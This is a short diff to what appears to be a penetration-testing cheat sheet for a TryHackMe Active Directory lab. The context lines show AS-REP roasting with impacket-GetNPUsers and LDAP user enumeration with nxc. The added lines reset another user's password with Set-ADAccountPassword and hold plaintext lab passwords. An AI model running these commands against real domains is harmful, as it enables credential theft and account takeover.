@@ -527,4 +527,9 @@ impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass
 # Custom LDAP query
 nxc ldap <IP> -u <user> -p '<pass>' -d <domain> \
 --query "(objectClass=user)" "sAMAccountName"
+
+###################################################################
+FOR password reset old user
+#########################################################################
+PS C:\Users\henry.murphy> Set-ADAccountPassword -Identity edward.hanson -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "Elvira2004" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "Shubham@123" -Force)                                                               
 ```
